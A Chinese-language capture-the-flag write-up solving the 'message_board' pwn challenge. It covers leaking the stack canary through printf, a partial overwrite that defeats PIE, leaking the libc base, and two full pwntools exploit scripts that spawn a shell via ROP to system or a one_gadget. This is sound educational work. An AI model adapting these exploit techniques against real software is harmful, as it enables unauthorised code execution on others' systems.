### messageboard

### 考点

- Canary绕过原理
- PIE绕过原理
- 对gdb调试器的使用

### 解题过程

- 使用`checksec`进行检查：![checksec](/img/posts/2023-10-23-messageboard/images/checksec.png)

![file](/img/posts/2023-10-23-messageboard/images/file.png)

​		可知程序为64位，有DEP、ASLR、Canary、PIE等保护。`Canary`是一种栈溢出保护手段，会在栈中压入随机值，如果进行栈溢出攻击，会导致随机值改变，导致验证失败，从而程序不会执行。`PIE(position-independent executable, 地址无关可执行文件)`技术就是一个针对代码段.text, 数据段.*data，.bss等固定地址的一个防护技术。同ASLR一样，应用了PIE的程序会在每次加载时都变换加载基址，从而使位于程序本身的gadget也失效。

- 使用`ldd`命令查看程序的依赖库libc和ld：

![ldd](/img/posts/2023-10-23-messageboard/images/ldd.png)

​		使用`patchelf`进行修改：

```shell
patchelf --replace-needed libc.so.6 ./libc-2.31.so ./message_board
```

```shell
patchelf --set-interpreter ~/Documents/tools/glibc-all-in-one/libs/2.31-0ubuntu9.12_amd64/ld-2.31.so ./message_board
```

![ldd-1](/img/posts/2023-10-23-messageboard/images/ldd-1.png)

- 构造python脚本，进行调试，查看程序vmmap以及stack的情况：

`vmmap`：后3位均为0，前几位每次调试都会发生变化

![vmmap](/img/posts/2023-10-23-messageboard/images/vmmap.png)

![vmmap-1](/img/posts/2023-10-23-messageboard/images/vmmap-1.png)

`stack`：其中有随机值`"0x7e9818f231b8c000"`和`"0xf0297d8f04ed1000"`

![stack](/img/posts/2023-10-23-messageboard/images/stack.png)

![stack-1](/img/posts/2023-10-23-messageboard/images/stack-1.png)

- 使用ida工具打开程序，逆向分析，在`sub_11C9`函数位置有`getchar`函数，只有输入回车符时才会结束输入，存在栈溢出漏洞：

![sub_11C9](/img/posts/2023-10-23-messageboard/images/sub_11C9.png)

- 由于`sub_11FF`函数中的`printf`函数`%s`参数仅在字符串结尾为`\x00`字符时才会停止输出，因此可以尝试在此处泄漏`canary`和`libc`的地址。

![sub_11FF](/img/posts/2023-10-23-messageboard/images/sub_11FF.png)

- 构造脚本，主要思路（五次栈溢出）：首先通过printf函数的输出特性泄漏`Canary`值，然后在第二次调用`sub_11C9`函数时，通过覆盖部分地址使程序本应执行到`0x1310`转而执行`0x130b`（通过覆盖最后一字节实现），如下图所示：

![partial write](/img/posts/2023-10-23-messageboard/images/partial write.png)

​		然后程序重新进入漏洞函数，通过栈溢出覆盖截断字符`\x00`使`printf`函数输出程序基址。如下图所示，通过计算偏移可以得到程序基址：

![程序基址](/img/posts/2023-10-23-messageboard/images/程序基址.png)

​		然后继续到第二个`sub_11c9`函数，根据`got`表获取到libc基址，最后根据libc基址以及`one_gadget`工具可以得到结果shell：

`python脚本如下`:

```python
from pwn import *

p = process('./message_board')

# 获取canary
payload = flat(b'a'*(0x20+8+1))
gdb.attach(p, 'b *$rebase(0x11FD)')
p.sendlineafter(b"What 's your name?\n", payload)
p.recvuntil(payload)
puts_canary_libc = p.recv(7)

canary = u64(puts_canary_libc.rjust(8, b'\x00'))
success(hex(canary))


# Parital Write， 重新跳转到漏洞函数
main_addr_offset = b'\x0B'
p.recvuntil(b'What do you want to say?\n')

payload = flat(b'b'*(0x20+8), p64(canary), p64(0), main_addr_offset)
p.sendline(payload)

# 获取程序基址
payload = flat(b'c'*(0x20+8+8+8))
p.sendlineafter(b"What 's your name?\n", payload)
p.recvuntil(payload)
mov_eax_addr = u64(p.recv(6).ljust(8, b'\x00'))
base_addr = mov_eax_addr - 0x1310

success(hex(base_addr))

# 获取libc基址
pop_rdi = base_addr + 0x1383
retn = base_addr + 0x12A8
elf = ELF('./message_board')
puts_plt = elf.plt['puts'] + base_addr
puts_got = elf.got['puts'] + base_addr

libc = ELF('./libc-2.31.so')
libc_puts_offset = libc.symbols['puts']  # 0x84420
libc_system_offset = libc.symbols['system']  # 0x52290
sub_11ff_addr = base_addr + 0x130B
payload = flat(b'd'*(0x20+8), p64(canary), p64(0), p64(retn), p64(pop_rdi), p64(puts_got), p64(puts_plt), p64(sub_11ff_addr))
p.sendlineafter(b'What do you want to say?\n', payload)
p.recvuntil(b"Thanks!\n")
puts_libc = p.recv(6)
puts_libc = u64(puts_libc.ljust(8, b'\x00'))
libc_base = puts_libc - libc_puts_offset
success(hex(libc_base))

# # one_gadget
# one_gadget = libc_base + 0xe3b01
# payload = flat(b'e'*(0x20+8), p64(canary), p64(0x0), p64(one_gadget))
# gdb.attach(p, 'b *$rebase(0x11FD)')
# p.sendlineafter(b"What 's your name?\n", payload)

# system函数
bin_sh_addr = libc_base + 0x1b45bd
system_addr = libc_base + libc_system_offset
payload = flat(b'f'*(0x20+8), p64(canary), p64(0), p64(retn), p64(pop_rdi), p64(bin_sh_addr), p64(system_addr))
p.sendlineafter(b"What 's your name?\n", payload)
p.sendlineafter(b'What do you want to say?\n', b'FFF')
# p.recvuntil(b"Thanks!\n")

p.interactive()
```

注：需要注意在进行代码的注入时，需要考虑栈帧对齐的问题，eg: `payload = flat(b'f'*(0x20+8), p64(canary), p64(0), p64(pop_rdi), p64(bin_sh_addr)`中`p64(0)`为赋给`rbp`寄存器的值，`p64(retn)`为将`pop rdi`进行栈对齐所需添加的占位值。

- 构造脚本，主要思路（四次栈溢出）：前两次栈溢出与前一种情况相同；

​		然后程序会再次执行漏洞函数，通过栈溢出覆盖截断字符`\x00`使得`printf`函数输出libc的基址。如下图所示，通过计算偏移可以得到libc的基址

![libc_base](/img/posts/2023-10-23-messageboard/images/libc_base.png)

​		然后继续到第二个`sub_11c9`函数，根据libc基址以及`one_gadget`工具可以得到结果shell：

`python脚本如下`:

```python
from pwn import *

p = process('./message_board')

# 获取canary
payload = flat(b'a'*(0x20+8+1))
gdb.attach(p, 'b *$rebase(0x11FD)')
p.sendlineafter(b"What 's your name?\n", payload)
p.recvuntil(payload)
puts_canary_libc = p.recv(7)

canary = u64(puts_canary_libc.rjust(8, b'\x00'))
success(hex(canary))


# Parital Write， 重新跳转到漏洞函数
main_addr_offset = b'\x0B'
p.recvuntil(b'What do you want to say?\n')

payload = flat(b'b'*(0x20+8), p64(canary), p64(0), main_addr_offset)
p.sendline(payload)

# 获取libc基址
libc = ELF('./libc-2.31.so')
payload = flat(b'c'*(0x20+8+8+8+16))
p.sendlineafter(b"What 's your name?\n", payload)
p.recvuntil(payload)

mov_edi_addr = p.recv(6)
print(mov_edi_addr)
mov_edi_addr = u64(mov_edi_addr.ljust(8, b'\x00'))
print(hex(mov_edi_addr))
libc_base = mov_edi_addr - 0x24083

success(hex(libc_base))

one_gadget = libc_base + 0xe3b01

payload = flat(b'e'*(0x20+8), p64(canary), p64(0x0), p64(one_gadget))
p.sendlineafter(b'What do you want to say?\n', payload)



p.interactive()
```



### 结果

![result](/img/posts/2023-10-23-messageboard/images/result.png)
